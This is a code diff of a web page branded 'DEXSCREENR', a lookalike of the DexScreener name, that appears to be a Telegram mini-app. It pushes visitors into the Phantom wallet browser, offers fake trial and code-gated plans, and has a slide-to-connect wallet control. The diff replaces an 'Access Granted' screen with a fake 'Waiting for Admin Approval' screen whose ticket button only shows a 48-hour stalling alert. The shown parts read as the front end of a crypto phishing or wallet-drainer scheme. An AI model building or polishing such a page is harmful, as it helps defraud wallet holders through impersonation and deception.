@@ -24,7 +24,6 @@
     position: relative;
   }
 
-  /* --- SCREEN 1: TELEGRAM WAITING --- */
   #telegram-screen {
     display: none; flex-direction: column; align-items: center; justify-content: center;
     text-align: center; width: 100%; max-width: 320px; position: absolute; z-index: 20;
@@ -41,9 +40,7 @@
     content: ''; position: absolute; width: 100%; height: 100%;
     border-radius: 50%; border: 1px solid #14F195; animation: pulse 2s infinite ease-out;
   }
-  
   @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }
-  
   .pulse-ring svg { width: 32px; height: 32px; color: #14F195; }
 
   #telegram-screen h1 { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
@@ -56,7 +53,6 @@
   }
   .open-phantom-btn:active { transform: scale(0.96); }
 
-  /* --- SCREEN 2: CLEAN BOOT INTRO --- */
   #boot-screen {
     display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
     background: #000; z-index: 9999; align-items: center; justify-content: center;
@@ -67,22 +63,15 @@
     font-size: 28px; font-weight: 900; letter-spacing: 4px;
     color: #ffffff; animation: pulseTitle 3s infinite ease-in-out alternate;
   }
+  @keyframes pulseTitle { 0% { text-shadow: 0 0 10px rgba(20, 241, 149, 0.2); opacity: 0.8; } 100% { text-shadow: 0 0 30px rgba(20, 241, 149, 0.8); opacity: 1; } }
 
-  @keyframes pulseTitle {
-    0% { text-shadow: 0 0 10px rgba(20, 241, 149, 0.2); opacity: 0.8; }
-    100% { text-shadow: 0 0 30px rgba(20, 241, 149, 0.8); opacity: 1; }
-  }
-
-  /* --- MAIN APP --- */
   #app-screen {
     display: none; flex-direction: column; align-items: center;
     width: 100%; max-width: 360px; animation: slideUp 1.2s cubic-bezier(0.16, 1, 0.3, 1);
     position: relative; z-index: 10;
   }
   
-  .bg-glow {
-    position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: -1; overflow: hidden; background: #050505;
-  }
+  .bg-glow { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: -1; overflow: hidden; background: #050505; }
   .orb { position: absolute; border-radius: 50%; filter: blur(100px); opacity: 0.3; animation: float 12s infinite ease-in-out alternate; }
   .orb-1 { width: 300px; height: 300px; background: rgba(20, 241, 149, 0.2); top: -5%; left: -10%; }
   .orb-2 { width: 400px; height: 400px; background: rgba(153, 69, 255, 0.15); bottom: -10%; right: -20%; animation-delay: -5s; }
@@ -105,10 +94,8 @@
   .plan-card {
     background: rgba(255, 255, 255, 0.03); border: 1px solid rgba(255, 255, 255, 0.06);
     border-radius: 16px; padding: 16px; display: flex; justify-content: space-between; align-items: center;
-    cursor: pointer; transition: all 0.3s ease; position: relative;
-    height: 72px;
+    cursor: pointer; transition: all 0.3s ease; position: relative; height: 72px;
   }
-  
   .plan-card:active { transform: scale(0.97); background: rgba(20, 241, 149, 0.1); border-color: rgba(20, 241, 149, 0.5); }
   .plan-card.free { border-color: rgba(20, 241, 149, 0.4); background: linear-gradient(90deg, rgba(20, 241, 149, 0.1) 0%, rgba(20, 241, 149, 0.02) 100%); }
   
@@ -118,28 +105,14 @@
   .plan-price { font-size: 15px; font-weight: 800; color: #14F195; }
   .plan-price.paid { color: #ffffff; }
 
-  .code-wrapper {
-    display: none; width: 100%; height: 100%; align-items: center; justify-content: space-between; animation: fadeIn 0.3s ease;
-  }
-  
-  .code-wrapper input {
-    background: transparent; border: none; outline: none; color: #fff; font-size: 16px; width: 80%; font-family: monospace;
-  }
-  
+  .code-wrapper { display: none; width: 100%; height: 100%; align-items: center; justify-content: space-between; animation: fadeIn 0.3s ease; }
+  .code-wrapper input { background: transparent; border: none; outline: none; color: #fff; font-size: 16px; width: 80%; font-family: monospace; }
   .code-wrapper input::placeholder { color: #52525b; font-family: -apple-system, sans-serif; font-size: 14px; }
   .code-wrapper input.error::placeholder { color: #ef4444; }
 
-  .close-btn {
-    background: rgba(255,255,255,0.1); border: none; color: #fff;
-    width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center;
-    cursor: pointer; font-size: 12px;
-  }
+  .close-btn { background: rgba(255,255,255,0.1); border: none; color: #fff; width: 24px; height: 24px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; font-size: 12px; }
 
-  @keyframes shake {
-    0%, 100% { transform: translateX(0); }
-    10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); }
-    20%, 40%, 60%, 80% { transform: translateX(5px); }
-  }
+  @keyframes shake { 0%, 100% { transform: translateX(0); } 10%, 30%, 50%, 70%, 90% { transform: translateX(-5px); } 20%, 40%, 60%, 80% { transform: translateX(5px); } }
   .shake { animation: shake 0.4s cubic-bezier(.36,.07,.19,.97) both; }
 
   #connect-screen { width: 100%; display: none; flex-direction: column; align-items: center; opacity: 0; transform: translateY(20px); transition: opacity 0.8s ease, transform 0.8s ease; }
@@ -158,28 +131,40 @@
   
   @keyframes spin { to { transform: rotate(360deg); } }
   @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
-  
   .back-btn { background: none; border: none; color: #52525b; font-size: 12px; font-weight: 500; margin-top: 24px; cursor: pointer; padding: 8px 16px; border-radius: 20px; transition: all 0.2s; }
+
+  /* --- DASHBOARD (WAITING FOR APPROVAL) --- */
+  #dashboard-screen { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; padding: 10px 0; text-align: center; }
   
-  #dashboard-screen { display: none; flex-direction: column; align-items: center; justify-content: center; width: 100%; padding: 20px 0; }
-  .dashboard-loader { width: 100%; height: 4px; background: rgba(255,255,255,0.1); border-radius: 2px; margin-top: 20px; overflow: hidden; }
-  .dashboard-bar { width: 0%; height: 100%; background: #14F195; animation: loadBar 3s ease-in-out forwards; }
-  @keyframes loadBar { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
+  .pending-icon {
+    width: 64px; height: 64px; border-radius: 50%; background: rgba(251, 191, 36, 0.1);
+    display: flex; align-items: center; justify-content: center; margin-bottom: 16px;
+    border: 1px solid rgba(251, 191, 36, 0.3);
+  }
+  .pending-icon svg { width: 32px; height: 32px; color: #fbbf24; animation: spin 4s linear infinite; }
+
+  .pending-title { font-size: 18px; font-weight: 700; color: #fff; margin-bottom: 8px; }
+  .pending-desc { font-size: 13px; color: #a1a1aa; line-height: 1.5; margin-bottom: 24px; padding: 0 10px; }
+  
+  .ticket-btn {
+    background: rgba(255, 255, 255, 0.05); border: 1px solid rgba(255, 255, 255, 0.1);
+    color: #ffffff; font-size: 13px; font-weight: 600; padding: 12px 24px; border-radius: 12px;
+    cursor: pointer; transition: all 0.2s;
+  }
+  .ticket-btn:active { background: rgba(255, 255, 255, 0.1); transform: scale(0.97); }
 </style>
 </head>
 <body>
 
-  <!-- TELEGRAM SCREEN (Waiting for Phantom) -->
   <div id="telegram-screen">
     <div class="pulse-ring">
       <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
     </div>
     <h1>Connect Wallet</h1>
-    <p>To continue, please open this application in the Phantom wallet browser.</p>
+    <p>Open this application inside the Phantom app or extension to continue.</p>
     <button class="open-phantom-btn" id="openPhantomBtn">Open in Phantom</button>
   </div>
 
-  <!-- BOOT SCREEN (Title only) -->
   <div id="boot-screen">
     <div class="boot-title">DEXSCREENR</div>
   </div>
@@ -189,7 +174,6 @@
     <div class="orb orb-2"></div>
   </div>
 
-  <!-- MAIN APP -->
   <div id="app-screen">
     <div class="glass-container">
       <div class="header">
@@ -198,7 +182,6 @@
       </div>
 
       <div id="pricing-screen">
-        <!-- FREE -->
         <div class="plan-card free" onclick="startLoading('Free Trial')">
           <div class="plan-info">
             <div><h3>1-Day Free Trial</h3><p>Launch special access</p></div>
@@ -206,7 +189,6 @@
           </div>
         </div>
 
-        <!-- CODE INPUTS -->
         <div class="plan-card" onclick="openCodeInput(this, '3-Day Access')">
           <div class="plan-info">
             <div><h3>3-Day Access</h3><p>Requires secret code</p></div>
@@ -252,7 +234,6 @@
         </div>
       </div>
 
-      <!-- CONNECT SCREEN -->
       <div id="connect-screen">
         <div class="status-text">Plan: <span id="selectedPlanText">FREE</span></div>
         <div class="slider-container" id="sliderContainer">
@@ -265,11 +246,14 @@
         <button class="back-btn" onclick="goBack()">Cancel and go back</button>
       </div>
 
-      <!-- DASHBOARD -->
+      <!-- DASHBOARD (PENDING APPROVAL) -->
       <div id="dashboard-screen">
-        <h3 style="color:#14F195; margin-bottom: 8px;">Access Granted</h3>
-        <p style="font-size: 12px; color:#a1a1aa;">Initializing live dashboard...</p>
-        <div class="dashboard-loader"><div class="dashboard-bar"></div></div>
+        <div class="pending-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
+        </div>
+        <h3 class="pending-title">Waiting for Admin Approval</h3>
+        <p class="pending-desc">Your access request has been submitted. An admin will verify your wallet shortly.</p>
+        <button class="ticket-btn" onclick="alert('Ticket creation is available after 48 hours of pending status.')">Make ticket if not approved in 48h</button>
       </div>
 
     </div>
@@ -281,7 +265,6 @@
   const appScreen = document.getElementById('app-screen');
   const openPhantomBtn = document.getElementById('openPhantomBtn');
 
-  // --- UMGEBUNG CHECK ---
   window.addEventListener('load', () => {
     if (window.Telegram && window.Telegram.WebApp) {
       window.Telegram.WebApp.ready();
@@ -290,27 +273,22 @@
 
     const isPhantom = window.phantom?.solana?.isPhantom;
     if (isPhantom) {
-      // In Phantom: Starte direkt mit dem Boot Intro
       tgScreen.style.display = 'none';
       startIntro();
     } else {
-      // In Telegram: Zeige Waiting Screen
       tgScreen.style.display = 'flex';
       bootScreen.style.display = 'none';
       appScreen.style.display = 'none';
     }
   });
 
-  // Deep Link zu Phantom
   openPhantomBtn.addEventListener('click', () => {
     const url = window.location.href;
     window.location.href = `https://phantom.app/ul/browse/${encodeURIComponent(url)}?ref=${encodeURIComponent(url)}`;
   });
 
-  // --- BOOT LOGIC ---
   function startIntro() {
     bootScreen.style.display = 'flex';
-    // Show Intro for 4 seconds
     setTimeout(() => {
       bootScreen.style.opacity = '0';
       setTimeout(() => {
@@ -320,7 +298,6 @@
     }, 4000);
   }
 
-  // --- MAIN UI LOGIC ---
   const pricingScreen = document.getElementById('pricing-screen');
   const connectScreen = document.getElementById('connect-screen');
   const dashboardScreen = document.getElementById('dashboard-screen');
@@ -340,10 +317,8 @@
     }, 100);
   }
 
-  // --- CODE INPUT LOGIC ---
   function openCodeInput(card, planName) {
     if (card.classList.contains('open')) return;
-    
     document.querySelectorAll('.plan-card').forEach(c => c.classList.remove('open'));
     
     card.classList.add('open');
@@ -399,7 +374,6 @@
     }
   }
 
-  // --- SLIDER LOGIC ---
   const container = document.getElementById('sliderContainer');
   const thumb = document.getElementById('sliderThumb');
   const text = document.getElementById('sliderText');
@@ -464,7 +438,7 @@
       setTimeout(() => {
         connectScreen.style.display = 'none';
         dashboardScreen.style.display = 'flex';
-        headerSub.textContent = "Dashboard Initializing";
+        headerSub.textContent = "Account Pending";
       }, 2000);
 
     } catch (e) { resetSlider(); }
